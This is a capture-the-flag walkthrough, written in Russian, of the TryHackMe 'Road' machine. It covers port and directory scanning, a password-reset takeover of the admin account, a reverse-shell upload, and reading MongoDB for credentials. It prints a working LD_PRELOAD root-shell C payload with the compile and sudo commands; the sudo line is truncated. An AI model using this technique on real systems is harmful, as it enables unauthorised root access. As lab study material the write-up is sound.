# Road

:white_check_mark:  [**Sockets**](#sockets)

:white_check_mark: [**Mongodb browsing**](#mongodb)

:white_check_mark: [**LD_PRELOAD(privesc)**](#ld_preload)
___

## Enumeration
Сканируем ip командой:
```
nmap -sC -sV road.thm
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e6:dc:88:69:de:a1:73:8e:84:5b:a1:3e:27:9f:07:24 (RSA)
|   256 6b:ea:18:5d:8d:c7:9e:9a:01:2c:dd:50:c5:f8:c8:05 (ECDSA)
|_  256 ef:06:d7:e4:b1:65:15:6e:94:62:cc:dd:f0:8a:1a:24 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Sky Couriers
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Road/1.png)

Поиск директорий:
```
gobuster dir -u http://road.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://road.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/07 22:16:09 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 305] [--> http://road.thm/assets/]
/v2                   (Status: 301) [Size: 301] [--> http://road.thm/v2/]
```
## Getting shell

Перейдем в директорию **"v2"**. Регистрируем нового пользователя

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Road/2.png)

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Road/3.png)

Меняем пароль для пользователя admin. И заходит в его аккаунт.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Road/4.png)

Загружаем обратную оболочку.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Road/5.png)

Видим, что обратная оболочка расположена в **/v2/profileimages/**

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Road/6.png)

Запускаем слушатель и получаем обратную оболочку.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Road/7.png)

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Road/8.png)

## Getting users credentials

<a name="sockets"></a>

Перечислим все запущенные сетевые службы:
```
ss -at
```
**ss** - утилита для исследования сокетов  
**a** - отображение всех сокетов  
**t** - отображение TCP сокетов

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Road/9.png)

<a name="mongodb"></a>

На порту 27017 находится база данных mongo. Подключимся к ней.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Road/10.png)

Просмотрим базу на предмет паролей пользователей.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Road/11.png)

## Privilege escalation

<a name="ld_preload"></a>

Нашли пароль от пользователя webdevelopers, подключимся по ssh. Посмотри права sudo у этого пользователя.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Road/12.png)

Видим строку:
```
env_keep+=LD_PRELOAD
```

Воспользуемся этой [статьей](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/)

Создаем файл shell.c

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Road/13.png)

Записываем в него код:
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() 
{
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Road/14.png)

Компилируем и запускаем файл.
```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles

sudo LD_PRELOAD=/tmp/shell.so /usr/bin/
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Road/15.png)

Получаем root.
